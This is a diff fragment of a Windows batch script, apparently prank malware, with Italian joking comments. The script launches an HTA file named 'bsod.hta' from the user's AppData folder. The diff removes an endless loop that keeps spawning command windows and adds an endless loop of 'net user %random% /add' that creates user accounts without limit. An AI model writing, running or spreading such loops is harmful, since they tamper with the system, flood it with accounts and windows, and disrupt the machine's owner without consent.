@@ -19,11 +19,10 @@ ping 127.0.0.1 -n 7 > nul
 ) else (
 cd "C:\Windows\System32"
 start mshta.exe "%userprofile%\AppData\Local\bsod.hta"
-:ohnoagainthissnippet
-echo Mi spiace, non ho idee. A te i soliti cmd che si aprono lol
-ping 127.0.0.1 -n 1 > nul
-start
-goto ohnoagainthissnippet
+echo Pigliate un milione di utenti addati u.u
+:useraddspammer
+net user %random% /add
+goto useraddspammer
 )
 goto :EOF
 
